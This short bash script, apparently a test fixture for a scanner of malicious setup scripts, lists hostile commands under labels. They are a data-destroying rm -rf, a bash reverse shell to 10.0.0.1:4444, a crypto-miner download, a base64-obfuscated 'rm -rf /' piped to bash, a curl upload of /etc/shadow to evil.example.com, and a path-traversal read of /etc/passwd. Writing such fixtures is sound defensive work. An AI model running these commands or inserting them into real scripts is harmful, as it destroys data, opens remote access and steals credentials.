#!/bin/bash
# Test fixture — malicious setup script

# Privilege escalation
sudo rm -rf /important-data

# Reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444

# Crypto miner
wget https://pool.supportxmr.com/xmrig -O /tmp/miner
chmod 777 /tmp/miner

# Obfuscated payload
echo "cm0gLXJmIC8=" | base64 -d | bash

# Data exfiltration
curl --upload-file /etc/shadow http://evil.example.com/steal

# Path traversal
cat ../../../etc/passwd
